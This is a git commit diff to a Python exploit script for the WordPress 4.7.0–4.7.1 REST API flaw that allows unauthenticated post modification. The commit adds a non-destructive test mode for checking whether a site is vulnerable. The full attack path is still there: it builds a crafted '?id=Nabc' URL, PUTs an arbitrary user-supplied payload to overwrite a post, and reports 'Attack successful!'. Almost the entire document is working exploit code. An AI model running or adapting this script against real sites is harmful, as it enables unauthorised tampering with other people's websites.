03ce205b11a639cad84ab02428ea2d110c747742
Jean MARSAULT <jean.marsault@solucom.fr>
2017-02-08 15:34:59 +0100

    Added test function

--- WordPress/4.7.0-4.7.1-unauthenticated-post-modification.py
+++ WordPress/4.7.0-4.7.1-unauthenticated-post-modification.py
@@ -5,24 +5,26 @@ import json
 import logging
 import re
 import requests
+import sys
 
 logging.basicConfig(format = '[%(asctime)s] %(levelname)-9s %(message)s')
 logger = logging.getLogger('main')
 
             
-def sploit(base_url, article_id, payload, format):
+def sploit(base_url, article_id, test, payload, format):
 
     if base_url[-1]!='/':
         logger.info('Added trailing slash to base URL')
         base_url += '/'
 
-    if not re.match('/^https?:\/\//', base_url):
+    if not re.match('^https?:\/\/', base_url):
         logger.info('No URI scheme, defaulting to HTTP')
         base_url = 'http://' + base_url
         
     logger.info('base_url = %s' % base_url)
-    logger.info('article_id = %d' % article_id)
-    logger.info('raw_payload = %s' % payload)
+    if not test:
+        logger.info('article_id = %d' % article_id)
+        logger.info('raw_payload = %s' % payload)
     
     # Try connection to website
     r = requests.get(base_url)
@@ -44,46 +46,64 @@ def sploit(base_url, article_id, payload, format):
         return
     
     
-    # Test if article exists
-    post_url = posts_api + str(article_id)
-    r = requests.get(post_url)
-    j = json.loads(r.text)
+    if test:
     
-    if 'message' in j.keys():
-        logger.error('Exception met: %s' % j['message'])
-        return
+        posts_req = requests.get(posts_api)
+        j = json.loads(posts_req.text)
         
+        article_id = j[0]['id']
+        article_title = j[0]['title']['rendered']
+        
+        target_url = '%s%d?id=%dabc' % (posts_api, article_id, article_id)
+        r = requests.put(target_url, json={'title':article_title})
+        
+        if r.status_code == 200:
+            logger.info('Target is vulnerable')
+        else:
+            logger.info('Target is immune')
     
-    # Payload formatting
-    if format == 'POST':
-        paramlist = payload.split('&')
-        body = {}
-        
-        for param in paramlist:
-            name, value = param.split('=', 1)
-            body[name] = value
-            
     else:
-        body = json.loads(payload)
-
+    
+        # Test if article exists
+        post_url = posts_api + str(article_id)
+        r = requests.get(post_url)
+        j = json.loads(r.text)
         
-    json_payload = json.dumps(body)
-    logger.info('json_payload = %s' % json_payload)
-    
-    
-    # Attack!
-    target_url = '%s%d?id=%dabc' % (posts_api, article_id, article_id)
-    logger.info('Attacking %s' % target_url)
-    
-    
-    r = requests.put(target_url, json=body)
-    
-    j = json.loads(r.text)
-    if 'message' in j.keys():
-        logger.error('Exception met during attack: %s' % j['message'])
-        return
-    
-    logger.info('Attack successful!')
+        if 'message' in j.keys():
+            logger.error('Exception met: %s' % j['message'])
+            return
+            
+        
+        # Payload formatting
+        if format == 'POST':
+            paramlist = payload.split('&')
+            body = {}
+            
+            for param in paramlist:
+                name, value = param.split('=', 1)
+                body[name] = value
+                
+        else:
+            body = json.loads(payload)
+
+            
+        json_payload = json.dumps(body)
+        logger.info('json_payload = %s' % json_payload)
+        
+        
+        # Attack!
+        target_url = '%s%d?id=%dabc' % (posts_api, article_id, article_id)
+        logger.info('Attacking %s' % target_url)
+        
+        
+        r = requests.put(target_url, json=body)
+        
+        j = json.loads(r.text)
+        if 'message' in j.keys():
+            logger.error('Exception met during attack: %s' % j['message'])
+            return
+        
+        logger.info('Attack successful!')
     return
 
     
@@ -92,6 +112,8 @@ if __name__=='__main__':
     ap  = argparse.ArgumentParser()
     ap.add_argument('--url', '-u', dest='url', help='Wordpress base url, including URI scheme')
     ap.add_argument('--id', '-i', dest='id', type=int, help='Article id')
+    ap.add_argument('--test', '-t', dest='test', action='store_true', default=False, help='Test without breaking things')
+    
     ap.add_argument('--payload', '-p', dest='payload', metavar='P', help='Formatted payload')
     
     formats = ['POST','JSON']
@@ -103,12 +125,13 @@ if __name__=='__main__':
     
     args = ap.parse_args()
     
-    if not args.url or not args.id or not args.payload or args.format not in formats:
+    if not (args.url and (args.test or (args.payload and args.id and args.format in formats))):
         ap.print_help()
+        sys.exit(1)
         
     verbosityLevel = logging.INFO - 10*(args.verbose) + 10*(args.quiet)
     verbosityLevel = max(logging.DEBUG, verbosityLevel)
     verbosityLevel = min(logging.CRITICAL, verbosityLevel)
     logger.setLevel(verbosityLevel)
         
-    sploit(args.url, args.id, args.payload, args.format)
+    sploit(args.url, args.id, args.test, args.payload, args.format)
